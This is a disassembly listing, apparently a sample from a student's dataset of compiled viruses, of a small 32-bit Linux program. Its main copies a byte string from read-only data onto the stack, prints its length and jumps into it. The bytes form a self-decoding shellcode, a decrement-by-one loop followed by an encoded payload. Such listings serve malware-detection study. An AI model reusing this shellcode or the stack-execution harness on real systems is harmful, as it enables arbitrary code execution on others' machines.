
/home/stas/Coursach/Выборки/compiled/viruses/13310:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 23                	add    %ah,(%ebx)
 8048199:	df ed                	fucomip %st(5),%st
 804819b:	ac                   	lods   %ds:(%esi),%al
 804819c:	c9                   	leave  
 804819d:	09 66 c1             	or     %esp,-0x3f(%esi)
 80481a0:	85 38                	test   %edi,(%eax)
 80481a2:	5a                   	pop    %edx
 80481a3:	98                   	cwtl   
 80481a4:	49                   	dec    %ecx
 80481a5:	e9 2f 9c 77 4d       	jmp    557c1dd9 <_end+0x4d777dad>
 80481aa:	f1                   	icebp  
 80481ab:	88                   	.byte 0x88

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	06                   	push   %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 06                	add    %al,(%esi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00                   	.byte 0x0
 80481c8:	ad                   	lods   %ds:(%esi),%eax
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x18c>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	2b 00                	sub    (%eax),%eax
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	1a 00                	sbb    (%eax),%al
	...
 80481f6:	00 00                	add    %al,(%eax)
 80481f8:	12 00                	adc    (%eax),%al
 80481fa:	00 00                	add    %al,(%eax)
 80481fc:	4b                   	dec    %ebx
	...
 8048205:	00 00                	add    %al,(%eax)
 8048207:	00 20                	add    %ah,(%eax)
 8048209:	00 00                	add    %al,(%eax)
 804820b:	00 32                	add    %dh,(%edx)
	...
 8048215:	00 00                	add    %al,(%eax)
 8048217:	00 12                	add    %dl,(%edx)
 8048219:	00 00                	add    %al,(%eax)
 804821b:	00 39                	add    %bh,(%ecx)
	...
 8048225:	00 00                	add    %al,(%eax)
 8048227:	00 12                	add    %dl,(%edx)
 8048229:	00 00                	add    %al,(%eax)
 804822b:	00 0b                	add    %cl,(%ebx)
 804822d:	00 00                	add    %al,(%eax)
 804822f:	00 9c 85 04 08 04 00 	add    %bl,0x40804(%ebp,%eax,4)
 8048236:	00 00                	add    %al,(%eax)
 8048238:	11 00                	adc    %eax,(%eax)
 804823a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804823c <.dynstr>:
 804823c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048240:	63 2e                	arpl   %bp,(%esi)
 8048242:	73 6f                	jae    80482b3 <_init-0x65>
 8048244:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048249:	4f                   	dec    %edi
 804824a:	5f                   	pop    %edi
 804824b:	73 74                	jae    80482c1 <_init-0x57>
 804824d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048254:	64 
 8048255:	00 5f 5f             	add    %bl,0x5f(%edi)
 8048258:	73 74                	jae    80482ce <_init-0x4a>
 804825a:	61                   	popa   
 804825b:	63 6b 5f             	arpl   %bp,0x5f(%ebx)
 804825e:	63 68 6b             	arpl   %bp,0x6b(%eax)
 8048261:	5f                   	pop    %edi
 8048262:	66 61                	popaw  
 8048264:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%eax,%eax,1),%ebp
 804826b:	74 
 804826c:	66                   	data16
 804826d:	00 73 74             	add    %dh,0x74(%ebx)
 8048270:	72 6c                	jb     80482de <_init-0x3a>
 8048272:	65 6e                	outsb  %gs:(%esi),(%dx)
 8048274:	00 5f 5f             	add    %bl,0x5f(%edi)
 8048277:	6c                   	insb   (%dx),%es:(%edi)
 8048278:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 804827f:	72 74                	jb     80482f5 <_init-0x23>
 8048281:	5f                   	pop    %edi
 8048282:	6d                   	insl   (%dx),%es:(%edi)
 8048283:	61                   	popa   
 8048284:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 804828b:	6f                   	outsl  %ds:(%esi),(%dx)
 804828c:	6e                   	outsb  %ds:(%esi),(%dx)
 804828d:	5f                   	pop    %edi
 804828e:	73 74                	jae    8048304 <_init-0x14>
 8048290:	61                   	popa   
 8048291:	72 74                	jb     8048307 <_init-0x11>
 8048293:	5f                   	pop    %edi
 8048294:	5f                   	pop    %edi
 8048295:	00 47 4c             	add    %al,0x4c(%edi)
 8048298:	49                   	dec    %ecx
 8048299:	42                   	inc    %edx
 804829a:	43                   	inc    %ebx
 804829b:	5f                   	pop    %edi
 804829c:	32 2e                	xor    (%esi),%ch
 804829e:	34 00                	xor    $0x0,%al
 80482a0:	47                   	inc    %edi
 80482a1:	4c                   	dec    %esp
 80482a2:	49                   	dec    %ecx
 80482a3:	42                   	inc    %edx
 80482a4:	43                   	inc    %ebx
 80482a5:	5f                   	pop    %edi
 80482a6:	32 2e                	xor    (%esi),%ch
 80482a8:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

080482aa <.gnu.version>:
 80482aa:	00 00                	add    %al,(%eax)
 80482ac:	02 00                	add    (%eax),%al
 80482ae:	03 00                	add    (%eax),%eax
 80482b0:	00 00                	add    %al,(%eax)
 80482b2:	02 00                	add    (%eax),%al
 80482b4:	02 00                	add    (%eax),%al
 80482b6:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482b8 <.gnu.version_r>:
 80482b8:	01 00                	add    %eax,(%eax)
 80482ba:	02 00                	add    (%eax),%al
 80482bc:	01 00                	add    %eax,(%eax)
 80482be:	00 00                	add    %al,(%eax)
 80482c0:	10 00                	adc    %al,(%eax)
 80482c2:	00 00                	add    %al,(%eax)
 80482c4:	00 00                	add    %al,(%eax)
 80482c6:	00 00                	add    %al,(%eax)
 80482c8:	14 69                	adc    $0x69,%al
 80482ca:	69 0d 00 00 03 00 5a 	imul   $0x5a,0x30000,%ecx
 80482d1:	00 00 00 
 80482d4:	10 00                	adc    %al,(%eax)
 80482d6:	00 00                	add    %al,(%eax)
 80482d8:	10 69 69             	adc    %ch,0x69(%ecx)
 80482db:	0d 00 00 02 00       	or     $0x20000,%eax
 80482e0:	64 00 00             	add    %al,%fs:(%eax)
 80482e3:	00 00                	add    %al,(%eax)
 80482e5:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

080482e8 <.rel.dyn>:
 80482e8:	fc                   	cld    
 80482e9:	9f                   	lahf   
 80482ea:	04 08                	add    $0x8,%al
 80482ec:	06                   	push   %es
 80482ed:	03 00                	add    (%eax),%eax
	...

Дизассемблирование раздела .rel.plt:

080482f0 <.rel.plt>:
 80482f0:	0c a0                	or     $0xa0,%al
 80482f2:	04 08                	add    $0x8,%al
 80482f4:	07                   	pop    %es
 80482f5:	01 00                	add    %eax,(%eax)
 80482f7:	00 10                	add    %dl,(%eax)
 80482f9:	a0 04 08 07 02       	mov    0x2070804,%al
 80482fe:	00 00                	add    %al,(%eax)
 8048300:	14 a0                	adc    $0xa0,%al
 8048302:	04 08                	add    $0x8,%al
 8048304:	07                   	pop    %es
 8048305:	03 00                	add    (%eax),%eax
 8048307:	00 18                	add    %bl,(%eax)
 8048309:	a0 04 08 07 04       	mov    0x4070804,%al
 804830e:	00 00                	add    %al,(%eax)
 8048310:	1c a0                	sbb    $0xa0,%al
 8048312:	04 08                	add    $0x8,%al
 8048314:	07                   	pop    %es
 8048315:	05                   	.byte 0x5
	...

Дизассемблирование раздела .init:

08048318 <_init>:
 8048318:	53                   	push   %ebx
 8048319:	83 ec 08             	sub    $0x8,%esp
 804831c:	e8 af 00 00 00       	call   80483d0 <__x86.get_pc_thunk.bx>
 8048321:	81 c3 df 1c 00 00    	add    $0x1cdf,%ebx
 8048327:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 804832d:	85 c0                	test   %eax,%eax
 804832f:	74 05                	je     8048336 <_init+0x1e>
 8048331:	e8 3a 00 00 00       	call   8048370 <__gmon_start__@plt>
 8048336:	83 c4 08             	add    $0x8,%esp
 8048339:	5b                   	pop    %ebx
 804833a:	c3                   	ret    

Дизассемблирование раздела .plt:

08048340 <printf@plt-0x10>:
 8048340:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048346:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804834c:	00 00                	add    %al,(%eax)
	...

08048350 <printf@plt>:
 8048350:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048356:	68 00 00 00 00       	push   $0x0
 804835b:	e9 e0 ff ff ff       	jmp    8048340 <_init+0x28>

08048360 <__stack_chk_fail@plt>:
 8048360:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048366:	68 08 00 00 00       	push   $0x8
 804836b:	e9 d0 ff ff ff       	jmp    8048340 <_init+0x28>

08048370 <__gmon_start__@plt>:
 8048370:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048376:	68 10 00 00 00       	push   $0x10
 804837b:	e9 c0 ff ff ff       	jmp    8048340 <_init+0x28>

08048380 <strlen@plt>:
 8048380:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048386:	68 18 00 00 00       	push   $0x18
 804838b:	e9 b0 ff ff ff       	jmp    8048340 <_init+0x28>

08048390 <__libc_start_main@plt>:
 8048390:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048396:	68 20 00 00 00       	push   $0x20
 804839b:	e9 a0 ff ff ff       	jmp    8048340 <_init+0x28>

Дизассемблирование раздела .text:

080483a0 <_start>:
 80483a0:	31 ed                	xor    %ebp,%ebp
 80483a2:	5e                   	pop    %esi
 80483a3:	89 e1                	mov    %esp,%ecx
 80483a5:	83 e4 f0             	and    $0xfffffff0,%esp
 80483a8:	50                   	push   %eax
 80483a9:	54                   	push   %esp
 80483aa:	52                   	push   %edx
 80483ab:	68 80 85 04 08       	push   $0x8048580
 80483b0:	68 10 85 04 08       	push   $0x8048510
 80483b5:	51                   	push   %ecx
 80483b6:	56                   	push   %esi
 80483b7:	68 9d 84 04 08       	push   $0x804849d
 80483bc:	e8 cf ff ff ff       	call   8048390 <__libc_start_main@plt>
 80483c1:	f4                   	hlt    
 80483c2:	66 90                	xchg   %ax,%ax
 80483c4:	66 90                	xchg   %ax,%ax
 80483c6:	66 90                	xchg   %ax,%ax
 80483c8:	66 90                	xchg   %ax,%ax
 80483ca:	66 90                	xchg   %ax,%ax
 80483cc:	66 90                	xchg   %ax,%ax
 80483ce:	66 90                	xchg   %ax,%ax

080483d0 <__x86.get_pc_thunk.bx>:
 80483d0:	8b 1c 24             	mov    (%esp),%ebx
 80483d3:	c3                   	ret    
 80483d4:	66 90                	xchg   %ax,%ax
 80483d6:	66 90                	xchg   %ax,%ax
 80483d8:	66 90                	xchg   %ax,%ax
 80483da:	66 90                	xchg   %ax,%ax
 80483dc:	66 90                	xchg   %ax,%ax
 80483de:	66 90                	xchg   %ax,%ax

080483e0 <deregister_tm_clones>:
 80483e0:	b8 2b a0 04 08       	mov    $0x804a02b,%eax
 80483e5:	2d 28 a0 04 08       	sub    $0x804a028,%eax
 80483ea:	83 f8 06             	cmp    $0x6,%eax
 80483ed:	77 01                	ja     80483f0 <deregister_tm_clones+0x10>
 80483ef:	c3                   	ret    
 80483f0:	b8 00 00 00 00       	mov    $0x0,%eax
 80483f5:	85 c0                	test   %eax,%eax
 80483f7:	74 f6                	je     80483ef <deregister_tm_clones+0xf>
 80483f9:	55                   	push   %ebp
 80483fa:	89 e5                	mov    %esp,%ebp
 80483fc:	83 ec 18             	sub    $0x18,%esp
 80483ff:	c7 04 24 28 a0 04 08 	movl   $0x804a028,(%esp)
 8048406:	ff d0                	call   *%eax
 8048408:	c9                   	leave  
 8048409:	c3                   	ret    
 804840a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048410 <register_tm_clones>:
 8048410:	b8 28 a0 04 08       	mov    $0x804a028,%eax
 8048415:	2d 28 a0 04 08       	sub    $0x804a028,%eax
 804841a:	c1 f8 02             	sar    $0x2,%eax
 804841d:	89 c2                	mov    %eax,%edx
 804841f:	c1 ea 1f             	shr    $0x1f,%edx
 8048422:	01 d0                	add    %edx,%eax
 8048424:	d1 f8                	sar    %eax
 8048426:	75 01                	jne    8048429 <register_tm_clones+0x19>
 8048428:	c3                   	ret    
 8048429:	ba 00 00 00 00       	mov    $0x0,%edx
 804842e:	85 d2                	test   %edx,%edx
 8048430:	74 f6                	je     8048428 <register_tm_clones+0x18>
 8048432:	55                   	push   %ebp
 8048433:	89 e5                	mov    %esp,%ebp
 8048435:	83 ec 18             	sub    $0x18,%esp
 8048438:	89 44 24 04          	mov    %eax,0x4(%esp)
 804843c:	c7 04 24 28 a0 04 08 	movl   $0x804a028,(%esp)
 8048443:	ff d2                	call   *%edx
 8048445:	c9                   	leave  
 8048446:	c3                   	ret    
 8048447:	89 f6                	mov    %esi,%esi
 8048449:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048450 <__do_global_dtors_aux>:
 8048450:	80 3d 28 a0 04 08 00 	cmpb   $0x0,0x804a028
 8048457:	75 13                	jne    804846c <__do_global_dtors_aux+0x1c>
 8048459:	55                   	push   %ebp
 804845a:	89 e5                	mov    %esp,%ebp
 804845c:	83 ec 08             	sub    $0x8,%esp
 804845f:	e8 7c ff ff ff       	call   80483e0 <deregister_tm_clones>
 8048464:	c6 05 28 a0 04 08 01 	movb   $0x1,0x804a028
 804846b:	c9                   	leave  
 804846c:	f3 c3                	repz ret 
 804846e:	66 90                	xchg   %ax,%ax

08048470 <frame_dummy>:
 8048470:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 8048475:	85 c0                	test   %eax,%eax
 8048477:	74 1f                	je     8048498 <frame_dummy+0x28>
 8048479:	b8 00 00 00 00       	mov    $0x0,%eax
 804847e:	85 c0                	test   %eax,%eax
 8048480:	74 16                	je     8048498 <frame_dummy+0x28>
 8048482:	55                   	push   %ebp
 8048483:	89 e5                	mov    %esp,%ebp
 8048485:	83 ec 18             	sub    $0x18,%esp
 8048488:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 804848f:	ff d0                	call   *%eax
 8048491:	c9                   	leave  
 8048492:	e9 79 ff ff ff       	jmp    8048410 <register_tm_clones>
 8048497:	90                   	nop
 8048498:	e9 73 ff ff ff       	jmp    8048410 <register_tm_clones>

0804849d <main>:
 804849d:	55                   	push   %ebp
 804849e:	89 e5                	mov    %esp,%ebp
 80484a0:	57                   	push   %edi
 80484a1:	56                   	push   %esi
 80484a2:	53                   	push   %ebx
 80484a3:	83 e4 f0             	and    $0xfffffff0,%esp
 80484a6:	83 ec 60             	sub    $0x60,%esp
 80484a9:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80484af:	89 44 24 5c          	mov    %eax,0x5c(%esp)
 80484b3:	31 c0                	xor    %eax,%eax
 80484b5:	8d 54 24 10          	lea    0x10(%esp),%edx
 80484b9:	bb ac 85 04 08       	mov    $0x80485ac,%ebx
 80484be:	b8 13 00 00 00       	mov    $0x13,%eax
 80484c3:	89 d7                	mov    %edx,%edi
 80484c5:	89 de                	mov    %ebx,%esi
 80484c7:	89 c1                	mov    %eax,%ecx
 80484c9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 80484cb:	8d 44 24 10          	lea    0x10(%esp),%eax
 80484cf:	89 04 24             	mov    %eax,(%esp)
 80484d2:	e8 a9 fe ff ff       	call   8048380 <strlen@plt>
 80484d7:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484db:	c7 04 24 a0 85 04 08 	movl   $0x80485a0,(%esp)
 80484e2:	e8 69 fe ff ff       	call   8048350 <printf@plt>
 80484e7:	8d 44 24 10          	lea    0x10(%esp),%eax
 80484eb:	ff d0                	call   *%eax
 80484ed:	8b 54 24 5c          	mov    0x5c(%esp),%edx
 80484f1:	65 33 15 14 00 00 00 	xor    %gs:0x14,%edx
 80484f8:	74 05                	je     80484ff <main+0x62>
 80484fa:	e8 61 fe ff ff       	call   8048360 <__stack_chk_fail@plt>
 80484ff:	8d 65 f4             	lea    -0xc(%ebp),%esp
 8048502:	5b                   	pop    %ebx
 8048503:	5e                   	pop    %esi
 8048504:	5f                   	pop    %edi
 8048505:	5d                   	pop    %ebp
 8048506:	c3                   	ret    
 8048507:	66 90                	xchg   %ax,%ax
 8048509:	66 90                	xchg   %ax,%ax
 804850b:	66 90                	xchg   %ax,%ax
 804850d:	66 90                	xchg   %ax,%ax
 804850f:	90                   	nop

08048510 <__libc_csu_init>:
 8048510:	55                   	push   %ebp
 8048511:	57                   	push   %edi
 8048512:	31 ff                	xor    %edi,%edi
 8048514:	56                   	push   %esi
 8048515:	53                   	push   %ebx
 8048516:	e8 b5 fe ff ff       	call   80483d0 <__x86.get_pc_thunk.bx>
 804851b:	81 c3 e5 1a 00 00    	add    $0x1ae5,%ebx
 8048521:	83 ec 1c             	sub    $0x1c,%esp
 8048524:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048528:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804852e:	e8 e5 fd ff ff       	call   8048318 <_init>
 8048533:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048539:	29 c6                	sub    %eax,%esi
 804853b:	c1 fe 02             	sar    $0x2,%esi
 804853e:	85 f6                	test   %esi,%esi
 8048540:	74 27                	je     8048569 <__libc_csu_init+0x59>
 8048542:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048548:	8b 44 24 38          	mov    0x38(%esp),%eax
 804854c:	89 2c 24             	mov    %ebp,(%esp)
 804854f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048553:	8b 44 24 34          	mov    0x34(%esp),%eax
 8048557:	89 44 24 04          	mov    %eax,0x4(%esp)
 804855b:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 8048562:	83 c7 01             	add    $0x1,%edi
 8048565:	39 f7                	cmp    %esi,%edi
 8048567:	75 df                	jne    8048548 <__libc_csu_init+0x38>
 8048569:	83 c4 1c             	add    $0x1c,%esp
 804856c:	5b                   	pop    %ebx
 804856d:	5e                   	pop    %esi
 804856e:	5f                   	pop    %edi
 804856f:	5d                   	pop    %ebp
 8048570:	c3                   	ret    
 8048571:	eb 0d                	jmp    8048580 <__libc_csu_fini>
 8048573:	90                   	nop
 8048574:	90                   	nop
 8048575:	90                   	nop
 8048576:	90                   	nop
 8048577:	90                   	nop
 8048578:	90                   	nop
 8048579:	90                   	nop
 804857a:	90                   	nop
 804857b:	90                   	nop
 804857c:	90                   	nop
 804857d:	90                   	nop
 804857e:	90                   	nop
 804857f:	90                   	nop

08048580 <__libc_csu_fini>:
 8048580:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

08048584 <_fini>:
 8048584:	53                   	push   %ebx
 8048585:	83 ec 08             	sub    $0x8,%esp
 8048588:	e8 43 fe ff ff       	call   80483d0 <__x86.get_pc_thunk.bx>
 804858d:	81 c3 73 1a 00 00    	add    $0x1a73,%ebx
 8048593:	83 c4 08             	add    $0x8,%esp
 8048596:	5b                   	pop    %ebx
 8048597:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048598 <_fp_hw>:
 8048598:	03 00                	add    (%eax),%eax
	...

0804859c <_IO_stdin_used>:
 804859c:	01 00                	add    %eax,(%eax)
 804859e:	02 00                	add    (%eax),%al
 80485a0:	4c                   	dec    %esp
 80485a1:	65 6e                	outsb  %gs:(%esi),(%dx)
 80485a3:	67 74 68             	addr16 je 804860e <_IO_stdin_used+0x72>
 80485a6:	3a 20                	cmp    (%eax),%ah
 80485a8:	25 64 0a 00 eb       	and    $0xeb000a64,%eax
 80485ad:	11 5e 31             	adc    %ebx,0x31(%esi)
 80485b0:	c9                   	leave  
 80485b1:	b1 51                	mov    $0x51,%cl
 80485b3:	80 6c 0e ff 01       	subb   $0x1,-0x1(%esi,%ecx,1)
 80485b8:	80 e9 01             	sub    $0x1,%cl
 80485bb:	75 f6                	jne    80485b3 <_IO_stdin_used+0x17>
 80485bd:	eb 05                	jmp    80485c4 <_IO_stdin_used+0x28>
 80485bf:	e8 ea ff ff ff       	call   80485ae <_IO_stdin_used+0x12>
 80485c4:	6b 0c 59 9a          	imul   $0xffffff9a,(%ecx,%ebx,2),%ecx
 80485c8:	53                   	push   %ebx
 80485c9:	69 65 70 78 6f 8a e7 	imul   $0xe78a6f78,0x70(%ebp),%esp
 80485d0:	53                   	push   %ebx
 80485d1:	69 66 75 69 31 8a e2 	imul   $0xe28a3169,0x75(%esi),%esp
 80485d8:	53                   	push   %ebx
 80485d9:	69 6f 67 6a 68 69 6a 	imul   $0x6a69686a,0x67(%edi),%ebp
 80485e0:	67                   	addr16
 80485e1:	64                   	fs
 80485e2:	70 69                	jo     804864d <_IO_stdin_used+0xb1>
 80485e4:	6a 6f                	push   $0x6f
 80485e6:	30 30                	xor    %dh,(%eax)
 80485e8:	69 30 30 74 63 8a    	imul   $0x8a637430,(%eax),%esi
 80485ee:	e4 53                	in     $0x53,%al
 80485f0:	57                   	push   %edi
 80485f1:	52                   	push   %edx
 80485f2:	54                   	push   %esp
 80485f3:	8a e2                	mov    %dl,%ah
 80485f5:	ce                   	into   
 80485f6:	81                   	.byte 0x81
	...

Дизассемблирование раздела .eh_frame_hdr:

080485f8 <.eh_frame_hdr>:
 80485f8:	01 1b                	add    %ebx,(%ebx)
 80485fa:	03 3b                	add    (%ebx),%edi
 80485fc:	28 00                	sub    %al,(%eax)
 80485fe:	00 00                	add    %al,(%eax)
 8048600:	04 00                	add    $0x0,%al
 8048602:	00 00                	add    %al,(%eax)
 8048604:	48                   	dec    %eax
 8048605:	fd                   	std    
 8048606:	ff                   	(bad)  
 8048607:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 804860b:	00 a5 fe ff ff 68    	add    %ah,0x68fffffe(%ebp)
 8048611:	00 00                	add    %al,(%eax)
 8048613:	00 18                	add    %bl,(%eax)
 8048615:	ff                   	(bad)  
 8048616:	ff                   	(bad)  
 8048617:	ff 94 00 00 00 88 ff 	call   *-0x780000(%eax,%eax,1)
 804861e:	ff                   	(bad)  
 804861f:	ff d0                	call   *%eax
 8048621:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

08048624 <__FRAME_END__-0xb8>:
 8048624:	14 00                	adc    $0x0,%al
 8048626:	00 00                	add    %al,(%eax)
 8048628:	00 00                	add    %al,(%eax)
 804862a:	00 00                	add    %al,(%eax)
 804862c:	01 7a 52             	add    %edi,0x52(%edx)
 804862f:	00 01                	add    %al,(%ecx)
 8048631:	7c 08                	jl     804863b <_IO_stdin_used+0x9f>
 8048633:	01 1b                	add    %ebx,(%ebx)
 8048635:	0c 04                	or     $0x4,%al
 8048637:	04 88                	add    $0x88,%al
 8048639:	01 00                	add    %eax,(%eax)
 804863b:	00 20                	add    %ah,(%eax)
 804863d:	00 00                	add    %al,(%eax)
 804863f:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048642:	00 00                	add    %al,(%eax)
 8048644:	fc                   	cld    
 8048645:	fc                   	cld    
 8048646:	ff                   	(bad)  
 8048647:	ff 60 00             	jmp    *0x0(%eax)
 804864a:	00 00                	add    %al,(%eax)
 804864c:	00 0e                	add    %cl,(%esi)
 804864e:	08 46 0e             	or     %al,0xe(%esi)
 8048651:	0c 4a                	or     $0x4a,%al
 8048653:	0f 0b                	ud2    
 8048655:	74 04                	je     804865b <_IO_stdin_used+0xbf>
 8048657:	78 00                	js     8048659 <_IO_stdin_used+0xbd>
 8048659:	3f                   	aas    
 804865a:	1a 3b                	sbb    (%ebx),%bh
 804865c:	2a 32                	sub    (%edx),%dh
 804865e:	24 22                	and    $0x22,%al
 8048660:	28 00                	sub    %al,(%eax)
 8048662:	00 00                	add    %al,(%eax)
 8048664:	40                   	inc    %eax
 8048665:	00 00                	add    %al,(%eax)
 8048667:	00 35 fe ff ff 6a    	add    %dh,0x6afffffe
 804866d:	00 00                	add    %al,(%eax)
 804866f:	00 00                	add    %al,(%eax)
 8048671:	41                   	inc    %ecx
 8048672:	0e                   	push   %cs
 8048673:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 8048679:	49                   	dec    %ecx
 804867a:	87 03                	xchg   %eax,(%ebx)
 804867c:	86 04 83             	xchg   %al,(%ebx,%eax,4)
 804867f:	05 02 5a c3 41       	add    $0x41c35a02,%eax
 8048684:	c6 41 c7 41          	movb   $0x41,-0x39(%ecx)
 8048688:	c5 0c 04             	lds    (%esp,%eax,1),%ecx
 804868b:	04 38                	add    $0x38,%al
 804868d:	00 00                	add    %al,(%eax)
 804868f:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
 8048693:	00 7c fe ff          	add    %bh,-0x1(%esi,%edi,8)
 8048697:	ff 61 00             	jmp    *0x0(%ecx)
 804869a:	00 00                	add    %al,(%eax)
 804869c:	00 41 0e             	add    %al,0xe(%ecx)
 804869f:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 80486a5:	87 03                	xchg   %eax,(%ebx)
 80486a7:	43                   	inc    %ebx
 80486a8:	0e                   	push   %cs
 80486a9:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80486af:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80486b6:	0e                   	push   %cs
 80486b7:	14 41                	adc    $0x41,%al
 80486b9:	c3                   	ret    
 80486ba:	0e                   	push   %cs
 80486bb:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80486be:	0e                   	push   %cs
 80486bf:	0c 41                	or     $0x41,%al
 80486c1:	c7                   	(bad)  
 80486c2:	0e                   	push   %cs
 80486c3:	08 41 c5             	or     %al,-0x3b(%ecx)
 80486c6:	0e                   	push   %cs
 80486c7:	04 10                	add    $0x10,%al
 80486c9:	00 00                	add    %al,(%eax)
 80486cb:	00 a8 00 00 00 b0    	add    %ch,-0x50000000(%eax)
 80486d1:	fe                   	(bad)  
 80486d2:	ff                   	(bad)  
 80486d3:	ff 02                	incl   (%edx)
 80486d5:	00 00                	add    %al,(%eax)
 80486d7:	00 00                	add    %al,(%eax)
 80486d9:	00 00                	add    %al,(%eax)
	...

080486dc <__FRAME_END__>:
 80486dc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	70 84                	jo     8049e8e <__FRAME_END__+0x17b2>
 8049f0a:	04 08                	add    $0x8,%al

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	50                   	push   %eax
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	18 83 04 08 0d 00    	sbb    %al,0xd0804(%ebx)
 8049f26:	00 00                	add    %al,(%eax)
 8049f28:	84 85 04 08 19 00    	test   %al,0x190804(%ebp)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
